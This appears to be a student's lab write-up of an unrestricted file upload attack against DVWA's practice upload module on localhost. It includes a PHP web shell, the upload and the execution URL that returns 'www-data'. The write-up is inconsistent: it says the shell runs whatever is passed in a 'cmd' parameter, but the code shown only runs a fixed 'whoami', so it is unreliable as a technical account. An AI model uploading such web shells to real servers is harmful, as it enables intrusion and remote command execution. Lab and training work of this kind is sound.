# F-04 — Unrestricted File Upload | Payload Progression

## Target
- Application: DVWA (Damn Vulnerable Web Application)
- Module: File Upload
- Security Level: Low
- Upload URL: `http://localhost:8080/vulnerabilities/upload/`
- Shell URL: `http://localhost:8080/hackable/uploads/shell.php`

---

## Step 1 — Baseline (Legitimate Upload)

**What I tried first:**
Uploaded a normal image file (test.jpg) using the file upload form.

**What happened:**
The server accepted it and returned:
```
../../hackable/uploads/test.jpg succesfully uploaded!
```

This confirmed two things:
1. The upload form works and stores files on the server
2. The upload destination path is `hackable/uploads/` — a directory
   that is inside the web root, meaning files there are directly
   accessible via browser URL

---

## Step 2 — Creating the PHP Web Shell

Created a file locally named `shell.php` containing:
```php
<?php
echo shell_exec("whoami");
?>
```

This is a minimal PHP web shell. When the server executes this file,
`$_GET['cmd']` picks up whatever is passed in the URL's `cmd`
parameter and runs it as an OS command. The output is printed back
to the browser.

---

## Step 3 — Attempting Upload of shell.php

**What I tried:**
Selected `shell.php` in the upload form and clicked Upload.

**What happened:**
```
../../hackable/uploads/shell.php succesfully uploaded!
```

The server accepted the PHP file with no restriction whatsoever.
No file type check, no extension block, no MIME type validation.

**Why this worked at Low security:**
The DVWA Low security level has zero validation — the PHP code
simply takes whatever file the browser sends and writes it to disk.
There is no check asking "is this actually an image?"

---

## Step 4 — Executing the Shell

**What I tried:**
Navigated to the uploaded shell in the browser:
```
http://localhost:8080/hackable/uploads/shell.php?cmd=whoami
```

**What happened:**
```
www-data
```

The PHP engine on the server executed `shell.php`, which ran the
`whoami` command on the OS and returned the result. The web server
is running as the `www-data` user.

---


---

## Why the Attack Worked 
 the application accepted and stored a PHP file without validating 
 the file extension,content type , or file contents , Because uploads 
 were stored inside a web-accessible directory, the uploaded PHP file 
 was executed by the server when accessed through a browser.
---

## Final Working Payload

<?php
echo shell_exec("whoami");
?>

**Execution URL pattern:**
```
http://localhost:8080/hackable/uploads/shell.php?cmd=<any OS command>
```

- **Effect:** Full Remote Code Execution on the server OS
- **Vulnerability:** Unrestricted File Upload → RCE
- **OWASP Category:** A05 : 2021 - Security Misconfiguration
- **DVWA Security Level tested:** Low
